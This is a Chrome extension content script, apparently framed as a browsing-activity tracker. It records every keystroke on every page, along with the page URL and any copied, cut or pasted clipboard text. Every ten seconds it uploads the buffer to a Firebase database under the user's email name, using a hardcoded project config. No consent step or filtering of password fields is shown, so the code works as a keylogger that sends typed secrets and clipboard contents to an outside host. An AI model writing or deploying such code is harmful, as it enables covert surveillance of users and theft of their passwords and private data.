/**
 * config variable info to initialize Firebase.
 */
var config = {
  apiKey: "AIzaSyDp8BOChOi_zaguCrDg8D_YP1NLHAlA_V0",
  authDomain: "test-be1cc.firebaseapp.com",
  databaseURL: "https://test-be1cc.firebaseio.com",
  projectId: "test-be1cc",
  storageBucket: "gs://test-be1cc.appspot.com",
  messagingSenderId: "1047082222814",
  appId: "1:1047082222814:web:4c0a9ff088bacca55eee4f",
  measurementId: "G-0392Q4KEVX"
};

/**
* Initializing Firebase
*/
firebase.initializeApp(config);


toBeUpdated = false; //status variable
var clipboardText = ""; //clipboard data variable
var bufferData = {}; //Buffered data that is yet to be uploaded to Firebase.
var userEmail = "default"; //userEmail
var keycount = 0; //Keydown count

/**
* Sending message to background script to get the user variable.
*/
chrome.extension.sendRequest({
  message: "letsgo"
});
chrome.runtime.onMessage.addListener(
  function(request, sender) {
      userEmail = request.message;
  });

/**
* function to push data to Firebase Database.
* @param {data Yet to be updated} bufferData 
*/
function writeUserData(bufferData) {
  userid = userEmail.split("@")[0];
  userid = userid.replace(/[&\/\\#,+()$~%.'":*?<>{}]/g, '_');
  firebase.database().ref('users/').child(userid).update(bufferData);
  toBeUpdated = false;
}


/**
* To keep track of the keystrokes.
* Included SHIFT, CTRL, CAPSLOCK, ALT etc.
* 
* At the same time adds the info of keycount,
* url, activity type, clipboard data to the Buffered data. 
*/
document.addEventListener("keydown", function(event) {
  keycount = keycount + 1;
  console.log(event.key, keycount);
  toBeUpdated = true;
  let hostname = getUrl();
  let activity = checkActivity(hostname);
  let epochTime = (new Date).getTime();
  bufferData[epochTime] = {
      "key": event.key,
      "keyCount": keycount,
      "url": hostname,
      "activity": activity,
      "clipboard": clipboardText
  };

});

/**
* function to get the url information from working tab.
*/
function getUrl() {
  let url = window.location.href;
  return url;
}

/**
* checks the activity and return the type of activity.
* Yet to develop.
* Idea is to implement as a cloud function.
* @param {url host name} hostname 
*/
function checkActivity(hostname) {
  let qnahostnames = ["www.quora.com", "stackoverflow.com", "www.reddit.com", "meta.stackoverflow.com", "www.codeproject.com", "groups.google.com", "programmersheaven.com"];
  let codehostnames = ["colab.research.google.com"];
  let videohostnames = ["www.youtube.com"];

  if (qnahostnames.includes(hostname))
      return "Q&A";
  else if (codehostnames.includes(hostname))
      return "code";
  else if (videohostnames.includes(hostname))
      return "video";
  else
      return "search";

}

/**
* timer for pushing data to the Firebase.
* At present it pushes data once at 10 seconds
*/
setInterval(function() {
  if (toBeUpdated) {
      toBeUpdated = false;
      writeUserData(bufferData);
      bufferData = {};
      clipboardText = "";
  }
}, 10000);

/**
* get selected text.
* used in implementation of copying clipboard data
*/
function geSelectionText() {
  let selectedText = "";
  if (window.getSelection) {
      selectedText = window.getSelection().toString();
  }
  return selectedText;
}

/**
* Event listener for copy to Clipboard
*/
document.addEventListener('copy', function() {
  let text = geSelectionText();
  if (text.length > 0) {
      clipboardText = text;
      console.log("Copied text", text);
  }
}, false)

/**
* Event listener for cut to clipboard
*/
document.addEventListener('cut', function() {
  let text = geSelectionText();
  if (text.length > 0) {
      clipboardText = text;
      console.log("This is cut text", text);
  }
}, false)

/**
* Event listener for paste from clipboard.
*/
document.addEventListener('paste', function(e) {
  let data = e.clipboardData.getData('Text');
  clipboardText = data;
});